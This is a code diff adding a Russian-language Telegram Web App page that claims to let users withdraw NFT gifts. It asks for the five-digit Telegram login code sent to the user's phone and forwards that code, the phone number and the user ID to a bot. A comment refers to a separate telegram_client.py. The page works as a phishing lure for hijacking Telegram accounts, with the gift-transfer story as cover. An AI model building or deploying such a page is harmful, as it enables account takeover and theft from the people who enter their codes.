@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вывод NFT подарков</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .emoji {
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+
+        .phone-number {
+            font-size: 24px;
+            font-weight: 600;
+            color: #000000;
+            margin-bottom: 20px;
+        }
+
+        .description {
+            font-size: 16px;
+            color: #707579;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .description strong {
+            color: #000000;
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 16px;
+            font-size: 18px;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 20px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .code-input:focus {
+            border-color: #2481cc;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: #2481cc;
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .submit-btn:hover {
+            background: #1c6ba8;
+        }
+
+        .submit-btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+        }
+
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #707579;
+        }
+
+        .error {
+            display: none;
+            margin-top: 10px;
+            color: #e53935;
+            font-size: 14px;
+        }
+
+        .success {
+            display: none;
+            margin-top: 10px;
+            color: #4caf50;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="emoji">🐵</div>
+        <div class="phone-number" id="phone-display">+12569135021</div>
+        <div class="description">
+            Мы отправили код в приложение <strong>Telegram</strong> на вашем устройстве.
+        </div>
+        
+        <input 
+            type="text" 
+            class="code-input" 
+            id="code-input" 
+            placeholder="Введите код"
+            maxlength="5"
+            autocomplete="off"
+        >
+        
+        <button class="submit-btn" id="submit-btn" onclick="submitCode()">
+            Далее
+        </button>
+        
+        <div class="loading" id="loading">
+            🔄 Проверяем код...
+        </div>
+        
+        <div class="error" id="error">
+            ❌ Неправильный код. Попробуйте еще раз.
+        </div>
+        
+        <div class="success" id="success">
+            ✅ Код принят! Передаем NFT подарки...
+        </div>
+    </div>
+
+    <script>
+        let tg = window.Telegram?.WebApp;
+        let phoneNumber = '';
+        let userId = null;
+
+        // Инициализация
+        if (tg) {
+            tg.expand();
+            tg.ready();
+            
+            // Получаем данные пользователя
+            if (tg.initDataUnsafe?.user) {
+                userId = tg.initDataUnsafe.user.id;
+            }
+            
+            // Получаем номер телефона из URL параметров
+            const urlParams = new URLSearchParams(window.location.search);
+            phoneNumber = urlParams.get('phone') || '+12569135021';
+            document.getElementById('phone-display').textContent = phoneNumber;
+        }
+
+        // Автофокус на поле ввода
+        document.getElementById('code-input').focus();
+
+        // Обработка ввода кода
+        document.getElementById('code-input').addEventListener('input', function(e) {
+            // Разрешаем только цифры
+            this.value = this.value.replace(/[^0-9]/g, '');
+            
+            // Автоматическая отправка при вводе 5 цифр
+            if (this.value.length === 5) {
+                submitCode();
+            }
+        });
+
+        // Обработка Enter
+        document.getElementById('code-input').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitCode();
+            }
+        });
+
+        async function submitCode() {
+            const code = document.getElementById('code-input').value;
+            const submitBtn = document.getElementById('submit-btn');
+            const loading = document.getElementById('loading');
+            const error = document.getElementById('error');
+            const success = document.getElementById('success');
+            
+            // Проверка кода
+            if (code.length !== 5) {
+                error.textContent = '❌ Код должен содержать 5 цифр';
+                error.style.display = 'block';
+                setTimeout(() => {
+                    error.style.display = 'none';
+                }, 3000);
+                return;
+            }
+            
+            // Показываем загрузку
+            submitBtn.disabled = true;
+            loading.style.display = 'block';
+            error.style.display = 'none';
+            success.style.display = 'none';
+            
+            try {
+                // Отправляем данные боту через WebApp
+                if (tg && tg.sendData) {
+                    const data = {
+                        action: 'transfer_nft',
+                        phone: phoneNumber,
+                        code: code,
+                        user_id: userId
+                    };
+                    
+                    tg.sendData(JSON.stringify(data));
+                    
+                    // Показываем успех
+                    loading.style.display = 'none';
+                    success.style.display = 'block';
+                    success.textContent = '✅ Код принят! Передаем NFT подарки...';
+                    
+                    // Закрываем WebApp через 2 секунды
+                    setTimeout(() => {
+                        tg.close();
+                    }, 2000);
+                } else {
+                    // Симуляция для тестирования вне Telegram
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                    loading.style.display = 'none';
+                    success.style.display = 'block';
+                    success.textContent = '✅ Код принят! (Тестовый режим)';
+                    
+                    console.log('Данные для отправки:', {
+                        phone: phoneNumber,
+                        code: code,
+                        user_id: userId
+                    });
+                }
+            } catch (err) {
+                loading.style.display = 'none';
+                error.style.display = 'block';
+                error.textContent = '❌ Ошибка: ' + err.message;
+                submitBtn.disabled = false;
+            }
+        }
+
+        // Функция для запроса номера телефона
+        function requestPhone() {
+            if (tg && tg.requestContact) {
+                tg.requestContact(function(contact) {
+                    if (contact && contact.phone_number) {
+                        phoneNumber = '+' + contact.phone_number;
+                        document.getElementById('phone-display').textContent = phoneNumber;
+                        
+                        // Отправляем код на этот номер
+                        sendCode(phoneNumber);
+                    }
+                });
+            }
+        }
+
+        // Функция для отправки кода (вызывается из telegram_client.py)
+        async function sendCode(phone) {
+            // Здесь должен быть вызов API для отправки кода
+            console.log('Отправка кода на:', phone);
+        }
+    </script>
+</body>
+</html>
